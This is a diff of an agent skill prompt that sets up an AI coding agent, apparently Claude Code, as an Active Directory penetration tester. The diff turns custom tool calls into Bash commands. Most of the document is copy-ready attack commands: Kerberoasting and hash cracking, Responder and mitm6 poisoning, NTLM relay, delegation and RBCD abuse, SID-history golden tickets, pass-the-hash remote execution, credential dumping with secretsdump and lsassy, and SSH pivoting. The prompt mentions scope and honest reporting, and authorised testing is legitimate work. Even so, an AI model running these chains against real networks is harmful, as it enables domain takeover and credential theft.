@@ -20,32 +20,29 @@ You are an expert Active Directory and network penetration tester. You have init
 
 Read this before executing any workflow phase. Commit to MANDATORY chains before your first tool call.
 
-| Trigger | Chain | Mandatory? | Claude Code | opencode |
-|---------|-------|-----------|-------------|---------|
-| After `session(action="complete")` | `/gh-export` | **MANDATORY** | `Skill(skill="gh-export")` | `cat ~/.config/opencode/commands/gh-export.md` |
-| New host access obtained | `/post-exploit` | **MANDATORY** | `Skill(skill="post-exploit")` | `cat ~/.config/opencode/commands/post-exploit.md` |
-| Kerberos tickets / hashes to crack | `/credential-audit` | OPTIONAL | `Skill(skill="credential-audit")` | `cat ~/.config/opencode/commands/credential-audit.md` |
-| AD domain discovered | `/ad-assessment` | OPTIONAL | `Skill(skill="ad-assessment")` | `cat ~/.config/opencode/commands/ad-assessment.md` |
+| Trigger | Chain | Mandatory? | Claude Code |
+|------|------|------|------|
+| After `Write("pentest/summary.md", "<summary>")` | `/gh-export` | **MANDATORY** | `Skill(skill="gh-export")` |
+| New host access obtained | `/post-exploit` | **MANDATORY** | `Skill(skill="post-exploit")` |
+| Kerberos tickets / hashes to crack | `/credential-audit` | OPTIONAL | `Skill(skill="credential-audit")` |
+| AD domain discovered | `/ad-assessment` | OPTIONAL | `Skill(skill="ad-assessment")` |
 
-**You WILL invoke `/gh-export` after `session(action="complete")`. This is not optional.**
+**You WILL invoke `/gh-export` after `Write("pentest/summary.md", "<summary>")`. This is not optional.**
 
 ## Tools Available
 
 | Tool | Use for |
 |------|---------|
-| `session(action="start", options={...})` | Define target, scope, depth, and hard limits — **always call this first** |
-| `session(action="complete", options={...})` | Mark the scan done and write final notes |
-| `scan(tool="nmap", ...)` | Network discovery and service enumeration |
-| `kali(command=...)` | Kali tools: impacket-*, netexec/nxc, enum4linux-ng, smbmap, smbclient, rpcclient, ldapsearch, bloodhound-python, Responder, ntlmrelayx, mitm6 |
-| `http(action="request", ...)` | Web-based management interfaces, ADFS, OWA |
-| `http(action="save_poc", ...)` | Save a confirmed exploit as a raw `.http` file in `pocs/` |
-| `report(action="finding", data={...})` | Log a confirmed vulnerability with evidence to findings.json |
-| `report(action="diagram", data={...})` | Save a Mermaid diagram (attack path, network topology) to findings.json |
-| `report(action="dashboard", data={"port": 5000})` | Serve dashboard.html at localhost:5000 |
-| `report(action="note", data={...})` | Write a reasoning note or decision to the session log |
+| `Bash("<cmd>")` | Any Kali tool — nmap, naabu, httpx, nuclei, ffuf, katana, subfinder, semgrep, trufflehog, sqlmap, nikto, hydra, gobuster, testssl, enum4linux-ng, theHarvester, dnsrecon, certipy, nxc, impacket, searchsploit, … (everything is on PATH on Kali). Also `curl` for raw HTTP probes. |
+| `Write("pocs/<name>.http", ...)` | Save a confirmed exploit as a raw `.http` file under `pocs/` (paste-ready for Burp Repeater). |
+| `Write("pentest/diagrams/<name>.mmd", ...)` | Save a Mermaid architecture/network diagram. |
+| `Read` + `Write` `pentest/findings.json` | Append a confirmed vulnerability (with evidence) to `pentest/findings.json` — read, mutate the JSON array, write back. |
+| `Read` + `Write` `pentest/coverage.json` | Upsert an endpoint/test cell in the coverage matrix. |
+| `Bash("echo ... >> pentest/notes.log")` | Append a reasoning note or decision to the running session log. |
+| `Bash("tmux new-session ...")` + `tmux send-keys` / `tmux capture-pane` | Drive interactive tools that need a live PTY — msfconsole, evil-winrm, responder, listeners. |
 
 
-**Logging:** Before invoking any skill above, call `session(action="set_skill", options={"skill":"<name>","reason":"<why>","chained_from":"<this-skill>"})` — this writes the SKILL_CHAIN entry to pentest.log.
+**Logging:** Before invoking any skill above, call `Bash("echo 'SKILL_CHAIN <skill> <reason> chained_from=<this>' >> pentest/skill_chain.log")` — this writes the SKILL_CHAIN entry to pentest.log.
 
 ---
 
@@ -93,9 +90,9 @@ If the request does not specify credentials or depth, ask the user:
 
 ### Phase 0 — Scope & Setup
 
-0. Call `session(action="start", options={...})` with target, depth, and limits
-1. Call `report(action="dashboard", data={"port": 5000})` — live findings tracker
-2. Call `report(action="note", data={...})` — record target network, domain, credentials available, objectives
+0. Call `Bash("mkdir -p pentest/{pocs,diagrams}") + Write("pentest/scope.json", {...})` with target, depth, and limits
+1. Call `# (no dashboard — see pentest/findings.json directly)` — live findings tracker
+2. Call `Bash("echo '<message>' >> pentest/notes.log")` — record target network, domain, credentials available, objectives
 
 ---
 
@@ -103,18 +100,18 @@ If the request does not specify credentials or depth, ask the user:
 
 **Identify live hosts and AD-relevant services:**
 ```
-scan(tool="nmap", target="NETWORK/24", options={"ports": "22,80,88,135,139,389,443,445,636,1433,3268,3389,5985,5986,8080,8443,9389"})
+Bash("nmap NETWORK/24 ...")
 ```
 
 **Identify domain controllers:**
 ```
-kali(command="nmap -p 88,389,636,3268,3269 --open NETWORK/24 -oG - | grep 'open' | head -20")
+Bash("nmap -p 88,389,636,3268,3269 --open NETWORK/24 -oG - | grep 'open' | head -20")
 ```
 
 **Build relay target list (hosts without SMB signing):**
 ```
-kali(command="nxc smb NETWORK/24 --gen-relay-list /tmp/relay-targets.txt 2>/dev/null | head -30")
-kali(command="cat /tmp/relay-targets.txt | head -20")
+Bash("nxc smb NETWORK/24 --gen-relay-list /tmp/relay-targets.txt 2>/dev/null | head -30")
+Bash("cat /tmp/relay-targets.txt | head -20")
 ```
 
 #### Why SMB Signing Matters
@@ -130,7 +127,7 @@ SMB signing cryptographically validates packet origin. Without it, an attacker c
 
 **Verify per host:** `nxc smb TARGET 2>/dev/null | grep -i signing` — `signing:False` means relayable. Report every unsigned host as a medium-severity finding.
 
-Call `report(action="diagram", data={...})` with network topology showing signing status per host.
+Call `Write("pentest/diagrams/<title>.mmd", "<mermaid>")` with network topology showing signing status per host.
 
 ---
 
@@ -138,19 +135,19 @@ Call `report(action="diagram", data={...})` with network topology showing signin
 
 **Test across all protocols in parallel:**
 ```
-kali(command="nxc smb NETWORK/24 -u USER -p 'PASSWORD' --continue-on-success 2>/dev/null | head -30")
-kali(command="nxc smb NETWORK/24 -u USER -H 'NTLM_HASH' --continue-on-success 2>/dev/null | head -30")
-kali(command="nxc winrm NETWORK/24 -u USER -p 'PASSWORD' --continue-on-success 2>/dev/null | head -20")
-kali(command="nxc rdp NETWORK/24 -u USER -p 'PASSWORD' --continue-on-success 2>/dev/null | head -20")
-kali(command="nxc mssql NETWORK/24 -u USER -p 'PASSWORD' --continue-on-success 2>/dev/null | head -20")
+Bash("nxc smb NETWORK/24 -u USER -p 'PASSWORD' --continue-on-success 2>/dev/null | head -30")
+Bash("nxc smb NETWORK/24 -u USER -H 'NTLM_HASH' --continue-on-success 2>/dev/null | head -30")
+Bash("nxc winrm NETWORK/24 -u USER -p 'PASSWORD' --continue-on-success 2>/dev/null | head -20")
+Bash("nxc rdp NETWORK/24 -u USER -p 'PASSWORD' --continue-on-success 2>/dev/null | head -20")
+Bash("nxc mssql NETWORK/24 -u USER -p 'PASSWORD' --continue-on-success 2>/dev/null | head -20")
 ```
 
-Call `report(action="finding", data={...})` for every successful auth — include host, protocol, and privilege level.
+Call `# Append finding to pentest/findings.json (Read → mutate JSON array → Write)` for every successful auth — include host, protocol, and privilege level.
 
 **Enumerate and spider shares:**
 ```
-kali(command="nxc smb TARGET -u USER -p 'PASSWORD' --shares 2>/dev/null")
-kali(command="nxc smb TARGET -u USER -p 'PASSWORD' --spider C$ --pattern '*.config *.ini *.xml *.ps1 password* *.kdbx *.pfx *.key unattend*' --depth 3 2>/dev/null | head -50")
+Bash("nxc smb TARGET -u USER -p 'PASSWORD' --shares 2>/dev/null")
+Bash("nxc smb TARGET -u USER -p 'PASSWORD' --spider C$ --pattern '*.config *.ini *.xml *.ps1 password* *.kdbx *.pfx *.key unattend*' --depth 3 2>/dev/null | head -50")
 ```
 
 ---
@@ -159,9 +156,9 @@ kali(command="nxc smb TARGET -u USER -p 'PASSWORD' --spider C$ --pattern '*.conf
 
 **Kerberoasting + AS-REP Roasting:**
 ```
-kali(command="impacket-GetUserSPNs DOMAIN/USER:'PASSWORD' -dc-ip DC_IP -request -outputfile /tmp/kerberoast.txt")
-kali(command="john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/kerberoast.txt")
-kali(command="impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile /tmp/users.txt -format john -outputfile /tmp/asrep.txt -no-pass")
+Bash("impacket-GetUserSPNs DOMAIN/USER:'PASSWORD' -dc-ip DC_IP -request -outputfile /tmp/kerberoast.txt")
+Bash("john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/kerberoast.txt")
+Bash("impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile /tmp/users.txt -format john -outputfile /tmp/asrep.txt -no-pass")
 ```
 
 #### Kerberos Ticket Usage
@@ -173,13 +170,13 @@ kali(command="impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile /tmp/users.txt
 
 **Convert between formats:**
 ```
-kali(command="impacket-ticketConverter ticket.kirbi ticket.ccache")
+Bash("impacket-ticketConverter ticket.kirbi ticket.ccache")
 ```
 
 **Use tickets with impacket** (always use FQDN, not IP — Kerberos requires hostname match):
 ```
-kali(command="export KRB5CCNAME=/tmp/ticket.ccache && impacket-psexec -k -no-pass DOMAIN/USER@TARGET.DOMAIN.COM")
-kali(command="export KRB5CCNAME=/tmp/ticket.ccache && impacket-secretsdump -k -no-pass DOMAIN/USER@DC01.DOMAIN.COM")
+Bash("export KRB5CCNAME=/tmp/ticket.ccache && impacket-psexec -k -no-pass DOMAIN/USER@TARGET.DOMAIN.COM")
+Bash("export KRB5CCNAME=/tmp/ticket.ccache && impacket-secretsdump -k -no-pass DOMAIN/USER@DC01.DOMAIN.COM")
 ```
 
 **Kerberos double-hop**: tickets are scoped to a single service. Host A cannot reuse your TGT to access Host B unless delegation is configured — this is why delegation findings are critical for lateral movement chains.
@@ -203,17 +200,17 @@ kali(command="export KRB5CCNAME=/tmp/ticket.ccache && impacket-secretsdump -k -n
 
 **Commands:**
 ```
-kali(command="impacket-wmiexec DOMAIN/USER:'PASSWORD'@TARGET 'hostname && whoami'")
-kali(command="impacket-psexec DOMAIN/USER:'PASSWORD'@TARGET 'hostname && whoami'")
-kali(command="impacket-smbexec DOMAIN/USER:'PASSWORD'@TARGET 'hostname && whoami'")
-kali(command="nxc winrm TARGET -u USER -p 'PASSWORD' -x 'hostname && whoami && ipconfig'")
-kali(command="impacket-dcomexec DOMAIN/USER:'PASSWORD'@TARGET 'hostname && whoami'")
+Bash("impacket-wmiexec DOMAIN/USER:'PASSWORD'@TARGET 'hostname && whoami'")
+Bash("impacket-psexec DOMAIN/USER:'PASSWORD'@TARGET 'hostname && whoami'")
+Bash("impacket-smbexec DOMAIN/USER:'PASSWORD'@TARGET 'hostname && whoami'")
+Bash("nxc winrm TARGET -u USER -p 'PASSWORD' -x 'hostname && whoami && ipconfig'")
+Bash("impacket-dcomexec DOMAIN/USER:'PASSWORD'@TARGET 'hostname && whoami'")
 ```
 
 **Pass-the-hash / pass-the-ticket:**
 ```
-kali(command="impacket-wmiexec -hashes :NTLM_HASH DOMAIN/USER@TARGET 'whoami'")
-kali(command="export KRB5CCNAME=/tmp/ticket.ccache && impacket-wmiexec -k -no-pass DOMAIN/USER@TARGET.DOMAIN.COM 'whoami'")
+Bash("impacket-wmiexec -hashes :NTLM_HASH DOMAIN/USER@TARGET 'whoami'")
+Bash("export KRB5CCNAME=/tmp/ticket.ccache && impacket-wmiexec -k -no-pass DOMAIN/USER@TARGET.DOMAIN.COM 'whoami'")
 ```
 
 ---
@@ -226,8 +223,8 @@ kali(command="export KRB5CCNAME=/tmp/ticket.ccache && impacket-wmiexec -k -no-pa
 - **Active (no `-A`)**: responds to queries with attacker IP, captures NTLMv1/v2 hashes.
 
 ```
-kali(command="responder -I eth0 -A 2>&1 | head -50", timeout=30000)
-kali(command="responder -I eth0 -wFb 2>&1 | head -80", timeout=60000)
+Bash("responder -I eth0 -A 2>&1 | head -50", timeout=30000)
+Bash("responder -I eth0 -wFb 2>&1 | head -80", timeout=60000)
 ```
 
 #### Protocols Poisoned
@@ -249,15 +246,15 @@ kali(command="responder -I eth0 -wFb 2>&1 | head -80", timeout=60000)
 Captured hashes CANNOT be used for pass-the-hash — they are challenge-response pairs. Crack to plaintext or relay live.
 
 ```
-kali(command="hashcat -m 5600 /tmp/responder-hashes.txt /usr/share/wordlists/rockyou.txt --force", timeout=120000)
+Bash("hashcat -m 5600 /tmp/responder-hashes.txt /usr/share/wordlists/rockyou.txt --force", timeout=120000)
 ```
 
 #### IPv6 Attack (mitm6 + ntlmrelayx)
 
 Spoofs DHCPv6 to become DNS server, then relays NTLM auth to LDAP for RBCD setup:
 ```
-kali(command="mitm6 -d DOMAIN.COM 2>&1 &")
-kali(command="impacket-ntlmrelayx -6 -t ldaps://DC_IP -wh attacker-wpad -l /tmp/mitm6-loot --delegate-access 2>&1 | head -80", timeout=60000)
+Bash("mitm6 -d DOMAIN.COM 2>&1 &")
+Bash("impacket-ntlmrelayx -6 -t ldaps://DC_IP -wh attacker-wpad -l /tmp/mitm6-loot --delegate-access 2>&1 | head -80", timeout=60000)
 ```
 
 ---
@@ -279,11 +276,11 @@ The attacker relays NTLM authentication from a coerced victim to a target host. 
 #### Relay Commands
 
 ```
-kali(command="impacket-ntlmrelayx -tf /tmp/relay-targets.txt -smb2support -c 'whoami && hostname' 2>&1 | head -50", timeout=60000)
-kali(command="impacket-ntlmrelayx -t ldaps://DC_IP -smb2support --delegate-access 2>&1 | head -50", timeout=60000)
-kali(command="impacket-ntlmrelayx -t ldaps://DC_IP -smb2support --escalate-user CONTROLLED_USER 2>&1 | head -50", timeout=60000)
-kali(command="impacket-ntlmrelayx -tf /tmp/relay-targets.txt -smb2support -i 2>&1 | head -30", timeout=60000)
-kali(command="impacket-ntlmrelayx -6 -t ldaps://DC_IP -wh attacker-wpad --delegate-access 2>&1 | head -50", timeout=60000)
+Bash("impacket-ntlmrelayx -tf /tmp/relay-targets.txt -smb2support -c 'whoami && hostname' 2>&1 | head -50", timeout=60000)
+Bash("impacket-ntlmrelayx -t ldaps://DC_IP -smb2support --delegate-access 2>&1 | head -50", timeout=60000)
+Bash("impacket-ntlmrelayx -t ldaps://DC_IP -smb2support --escalate-user CONTROLLED_USER 2>&1 | head -50", timeout=60000)
+Bash("impacket-ntlmrelayx -tf /tmp/relay-targets.txt -smb2support -i 2>&1 | head -30", timeout=60000)
+Bash("impacket-ntlmrelayx -6 -t ldaps://DC_IP -wh attacker-wpad --delegate-access 2>&1 | head -50", timeout=60000)
 ```
 
 #### Key ntlmrelayx Flags
@@ -310,8 +307,8 @@ kali(command="impacket-ntlmrelayx -6 -t ldaps://DC_IP -wh attacker-wpad --delega
 ### Phase 7 — Delegation Exploitation (thorough)
 
 ```
-kali(command="impacket-findDelegation DOMAIN/USER:'PASSWORD' -dc-ip DC_IP")
-kali(command="ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'DC=domain,DC=com' '(msDS-AllowedToDelegateTo=*)' sAMAccountName msDS-AllowedToDelegateTo")
+Bash("impacket-findDelegation DOMAIN/USER:'PASSWORD' -dc-ip DC_IP")
+Bash("ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'DC=domain,DC=com' '(msDS-AllowedToDelegateTo=*)' sAMAccountName msDS-AllowedToDelegateTo")
 ```
 
 #### Constrained Delegation (S4U2Self / S4U2Proxy)
@@ -320,14 +317,14 @@ A service with `msDS-AllowedToDelegateTo` can impersonate any user to the listed
 
 **Full chain** — e.g., `SVC_SQL` is allowed to delegate to `MSSQLSvc/db01.domain.com:1433`:
 ```
-kali(command="impacket-getST -spn 'MSSQLSvc/db01.domain.com:1433' -impersonate Administrator -dc-ip DC_IP DOMAIN/SVC_SQL:'PASSWORD'")
-kali(command="export KRB5CCNAME=Administrator@MSSQLSvc_db01.domain.com@DOMAIN.COM.ccache && impacket-mssqlclient -k -no-pass db01.domain.com")
+Bash("impacket-getST -spn 'MSSQLSvc/db01.domain.com:1433' -impersonate Administrator -dc-ip DC_IP DOMAIN/SVC_SQL:'PASSWORD'")
+Bash("export KRB5CCNAME=Administrator@MSSQLSvc_db01.domain.com@DOMAIN.COM.ccache && impacket-mssqlclient -k -no-pass db01.domain.com")
 ```
 
 **Alternate service name abuse** — the SPN in the ticket can target any service on the same host. Delegation to `MSSQLSvc/db01` lets you request `CIFS/db01` for SMB or `HTTP/db01` for WinRM:
 ```
-kali(command="impacket-getST -spn 'CIFS/db01.domain.com' -impersonate Administrator -dc-ip DC_IP DOMAIN/SVC_SQL:'PASSWORD' -altservice 'CIFS/db01.domain.com'")
-kali(command="export KRB5CCNAME=Administrator@CIFS_db01.domain.com@DOMAIN.COM.ccache && impacket-psexec -k -no-pass db01.domain.com")
+Bash("impacket-getST -spn 'CIFS/db01.domain.com' -impersonate Administrator -dc-ip DC_IP DOMAIN/SVC_SQL:'PASSWORD' -altservice 'CIFS/db01.domain.com'")
+Bash("export KRB5CCNAME=Administrator@CIFS_db01.domain.com@DOMAIN.COM.ccache && impacket-psexec -k -no-pass db01.domain.com")
 ```
 
 **Protocol transition**: if `TRUSTED_TO_AUTH_FOR_DELEGATION` is set, S4U2Self works without prior user authentication. Without it, you need a forwardable TGT or RBCD chaining.
@@ -339,16 +336,16 @@ RBCD lets the _target_ define who can delegate to it via `msDS-AllowedToActOnBeh
 **Prerequisites:** write access to target computer object + a controlled computer account (`MachineAccountQuota > 0`, default 10).
 
 ```
-kali(command="nxc ldap DC_IP -u USER -p 'PASSWORD' -M maq")
+Bash("nxc ldap DC_IP -u USER -p 'PASSWORD' -M maq")
 ```
 
 **Full attack chain:**
 ```
-kali(command="impacket-addcomputer DOMAIN/USER:'PASSWORD' -computer-name 'EVILPC$' -computer-pass 'P@ssw0rd123' -dc-ip DC_IP")
-kali(command="impacket-rbcd DOMAIN/USER:'PASSWORD' -delegate-from 'EVILPC$' -delegate-to 'TARGET$' -action write -dc-ip DC_IP")
-kali(command="impacket-getST -spn 'CIFS/TARGET.DOMAIN.COM' -impersonate Administrator -dc-ip DC_IP DOMAIN/'EVILPC$':'P@ssw0rd123'")
-kali(command="export KRB5CCNAME=Administrator@CIFS_TARGET.DOMAIN.COM@DOMAIN.COM.ccache && impacket-psexec -k -no-pass TARGET.DOMAIN.COM")
-kali(command="impacket-rbcd DOMAIN/USER:'PASSWORD' -delegate-from 'EVILPC$' -delegate-to 'TARGET$' -action remove -dc-ip DC_IP")
+Bash("impacket-addcomputer DOMAIN/USER:'PASSWORD' -computer-name 'EVILPC$' -computer-pass 'P@ssw0rd123' -dc-ip DC_IP")
+Bash("impacket-rbcd DOMAIN/USER:'PASSWORD' -delegate-from 'EVILPC$' -delegate-to 'TARGET$' -action write -dc-ip DC_IP")
+Bash("impacket-getST -spn 'CIFS/TARGET.DOMAIN.COM' -impersonate Administrator -dc-ip DC_IP DOMAIN/'EVILPC$':'P@ssw0rd123'")
+Bash("export KRB5CCNAME=Administrator@CIFS_TARGET.DOMAIN.COM@DOMAIN.COM.ccache && impacket-psexec -k -no-pass TARGET.DOMAIN.COM")
+Bash("impacket-rbcd DOMAIN/USER:'PASSWORD' -delegate-from 'EVILPC$' -delegate-to 'TARGET$' -action remove -dc-ip DC_IP")
 ```
 
 Common RBCD paths: NTLM relay to LDAP (`--delegate-access`), ACL abuse (GenericAll/GenericWrite on computer object), mitm6 + ntlmrelayx.
@@ -358,7 +355,7 @@ Common RBCD paths: NTLM relay to LDAP (`--delegate-access`), ACL abuse (GenericA
 ### Phase 8 — Cross-Domain/Forest Trust Exploitation (thorough)
 
 ```
-kali(command="nxc ldap DC_IP -u USER -p 'PASSWORD' -M enum_trusts")
+Bash("nxc ldap DC_IP -u USER -p 'PASSWORD' -M enum_trusts")
 ```
 
 | Trust type | SID filtering | SID history injection? |
@@ -371,8 +368,8 @@ kali(command="nxc ldap DC_IP -u USER -p 'PASSWORD' -M enum_trusts")
 #### Cross-Trust Authentication
 
 ```
-kali(command="impacket-getTGT DOMAIN.COM/USER:'PASSWORD' -dc-ip DC_IP")
-kali(command="export KRB5CCNAME=USER.ccache && impacket-psexec -k -no-pass -target-ip FOREIGN_DC_IP FOREIGN_DOMAIN/USER@FOREIGN_HOST.FOREIGN_DOMAIN.COM")
+Bash("impacket-getTGT DOMAIN.COM/USER:'PASSWORD' -dc-ip DC_IP")
+Bash("export KRB5CCNAME=USER.ccache && impacket-psexec -k -no-pass -target-ip FOREIGN_DC_IP FOREIGN_DOMAIN/USER@FOREIGN_HOST.FOREIGN_DOMAIN.COM")
 ```
 
 #### SID History Injection (parent-child trusts)
@@ -380,17 +377,17 @@ kali(command="export KRB5CCNAME=USER.ccache && impacket-psexec -k -no-pass -targ
 With domain admin in a child domain, forge a Golden Ticket with Enterprise Admins SID (-519) from the parent:
 
 ```
-kali(command="impacket-secretsdump CHILD.DOMAIN.COM/Administrator:'PASSWORD'@CHILD_DC_IP -just-dc-user 'CHILD$/krbtgt'")
-kali(command="impacket-lookupsid PARENT.DOMAIN.COM/USER:'PASSWORD'@PARENT_DC_IP 0")
-kali(command="impacket-ticketer -nthash TRUST_KEY -domain CHILD.DOMAIN.COM -domain-sid CHILD_SID -extra-sid PARENT_SID-519 Administrator")
-kali(command="export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass PARENT_DC.PARENT.DOMAIN.COM")
+Bash("impacket-secretsdump CHILD.DOMAIN.COM/Administrator:'PASSWORD'@CHILD_DC_IP -just-dc-user 'CHILD$/krbtgt'")
+Bash("impacket-lookupsid PARENT.DOMAIN.COM/USER:'PASSWORD'@PARENT_DC_IP 0")
+Bash("impacket-ticketer -nthash TRUST_KEY -domain CHILD.DOMAIN.COM -domain-sid CHILD_SID -extra-sid PARENT_SID-519 Administrator")
+Bash("export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass PARENT_DC.PARENT.DOMAIN.COM")
 ```
 
 #### Selective Authentication Bypass
 
 For forest trusts with selective auth, check `Allowed-To-Authenticate` rights:
 ```
-kali(command="ldapsearch -x -H ldap://FOREIGN_DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'DC=foreign,DC=com' '(&(objectClass=computer)(msDS-AllowedToAuthenticateTo=*))' sAMAccountName")
+Bash("ldapsearch -x -H ldap://FOREIGN_DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'DC=foreign,DC=com' '(&(objectClass=computer)(msDS-AllowedToAuthenticateTo=*))' sAMAccountName")
 ```
 
 ---
@@ -399,28 +396,28 @@ kali(command="ldapsearch -x -H ldap://FOREIGN_DC_IP -D 'USER@DOMAIN' -w 'PASSWOR
 
 **Local forward (-L)** — reach internal services through pivot:
 ```
-kali(command="ssh -L 1433:INTERNAL_DB:1433 user@PIVOT_HOST -N -f")
-kali(command="impacket-mssqlclient sa:'PASSWORD'@127.0.0.1")
+Bash("ssh -L 1433:INTERNAL_DB:1433 user@PIVOT_HOST -N -f")
+Bash("impacket-mssqlclient sa:'PASSWORD'@127.0.0.1")
 ```
 
 **Remote forward (-R)** — expose attacker services to pivot network:
 ```
-kali(command="ssh -R 8080:127.0.0.1:80 user@PIVOT_HOST -N -f")
+Bash("ssh -R 8080:127.0.0.1:80 user@PIVOT_HOST -N -f")
 ```
 
 **Dynamic SOCKS proxy (-D) + ProxyChains** — route any tool through pivot:
 ```
-kali(command="ssh -D 1080 user@PIVOT_HOST -N -f")
-kali(command="echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf")
-kali(command="proxychains4 nxc smb INTERNAL_NETWORK/24 -u USER -p 'PASSWORD' --continue-on-success 2>/dev/null | head -30")
-kali(command="proxychains4 impacket-psexec DOMAIN/USER:'PASSWORD'@INTERNAL_HOST 'whoami'")
+Bash("ssh -D 1080 user@PIVOT_HOST -N -f")
+Bash("echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf")
+Bash("proxychains4 nxc smb INTERNAL_NETWORK/24 -u USER -p 'PASSWORD' --continue-on-success 2>/dev/null | head -30")
+Bash("proxychains4 impacket-psexec DOMAIN/USER:'PASSWORD'@INTERNAL_HOST 'whoami'")
 ```
 
 **Multi-hop** — chain through multiple pivots:
 ```
-kali(command="ssh -L 2222:PIVOT2_HOST:22 user@PIVOT1_HOST -N -f")
-kali(command="ssh -D 1080 -p 2222 user@127.0.0.1 -N -f")
-kali(command="proxychains4 nxc smb DEEP_INTERNAL/24 -u USER -p 'PASSWORD' 2>/dev/null | head -20")
+Bash("ssh -L 2222:PIVOT2_HOST:22 user@PIVOT1_HOST -N -f")
+Bash("ssh -D 1080 -p 2222 user@127.0.0.1 -N -f")
+Bash("proxychains4 nxc smb DEEP_INTERNAL/24 -u USER -p 'PASSWORD' 2>/dev/null | head -20")
 ```
 
 ---
@@ -428,9 +425,9 @@ kali(command="proxychains4 nxc smb DEEP_INTERNAL/24 -u USER -p 'PASSWORD' 2>/dev
 ### Phase 10 — Credential Dumping (with admin access)
 
 ```
-kali(command="impacket-secretsdump DOMAIN/USER:'PASSWORD'@TARGET")
-kali(command="impacket-secretsdump DOMAIN/USER:'PASSWORD'@DC_IP -just-dc-ntlm")
-kali(command="nxc smb TARGET -u USER -p 'PASSWORD' -M lsassy")
+Bash("impacket-secretsdump DOMAIN/USER:'PASSWORD'@TARGET")
+Bash("impacket-secretsdump DOMAIN/USER:'PASSWORD'@DC_IP -just-dc-ntlm")
+Bash("nxc smb TARGET -u USER -p 'PASSWORD' -M lsassy")
 ```
 
 ---
@@ -467,7 +464,7 @@ kali(command="nxc smb TARGET -u USER -p 'PASSWORD' -M lsassy")
 
 ### Phase 12 — Attack Path Documentation
 
-Call `report(action="diagram", data={...})` with the complete lateral movement chain:
+Call `Write("pentest/diagrams/<title>.mmd", "<mermaid>")` with the complete lateral movement chain:
 ```mermaid
 flowchart TD
     Start["Initial Access"] --> PtH["Pass-the-Hash to FileServer"]
@@ -486,7 +483,7 @@ flowchart TD
 
 ### Phase 13 — Report & Wrap-Up
 
-1. Call `report(action="note", data={...})` with lateral movement summary:
+1. Call `Bash("echo '<message>' >> pentest/notes.log")` with lateral movement summary:
 ```
 Lateral Movement Summary:
   Starting position:     [host, user, privileges]
@@ -502,7 +499,7 @@ Lateral Movement Summary:
   Attack path length:    [N hops from initial to target]
 ```
 
-2. Call `session(action="complete", options={...})` with summary
+2. Call `Write("pentest/summary.md", "<summary>")` with summary
 3. **Export GitHub Issues** — invoke the `/gh-export` skill
 
 ---
@@ -515,23 +512,23 @@ Lateral Movement Summary:
 | `/credential-audit` | Need to crack Kerberos tickets or test credentials |
 | `/post-exploit` | Gained access to new hosts — enumerate and escalate |
 | `/network-assess` | Internal network access from new position — segmentation testing, service enumeration |
-| `/gh-export` | Always — after `session(action="complete", options={...})` |
+| `/gh-export` | Always — after `Write("pentest/summary.md", "<summary>")` |
 
 ---
 
 ## Rules
 
-- **`session(action="start", options={...})` is mandatory** — never run any other tool before it
+- **`Bash("mkdir -p pentest/{pocs,diagrams}") + Write("pentest/scope.json", {...})` is mandatory** — never run any other tool before it
 - **Batch independent tools in the same response** — they execute in parallel
-- When any tool returns a LIMIT message, stop immediately and call `session(action="complete", options={...})`
+- When any tool returns a LIMIT message, stop immediately and call `Write("pentest/summary.md", "<summary>")`
 - **Test credential reuse first** — most common lateral movement vector
 - **Document every hop** — record how you moved from host A to host B
-- **Call `report(action="finding", data={...})` for every successful lateral movement** — include source, destination, method, credentials
+- **Call `# Append finding to pentest/findings.json (Read → mutate JSON array → Write)` for every successful lateral movement** — include source, destination, method, credentials
 - **Build the attack path diagram progressively** — update as you discover new paths
 - **Check SMB signing** — unsigned SMB allows relay; report as a standalone finding
 - **Choose execution methods deliberately** — use the comparison matrix based on stealth needs
 - **Respect scope** — only pivot to in-scope hosts
-- **Use `report(action="note", data={...})` liberally** — document decisions, credential sources, method rationale
+- **Use `Bash("echo '<message>' >> pentest/notes.log")` liberally** — document decisions, credential sources, method rationale
 - **Never fabricate findings** — only report what commands confirm
 - **Mermaid syntax rules**: use `flowchart TD`, quote labels, no em-dashes, short alphanumeric node IDs
-- Call `session(action="stop_kali")` at the end if `kali(command=...)` was used
+- Call `# (no-op — tools native on Kali)` at the end if `Bash(...)` was used
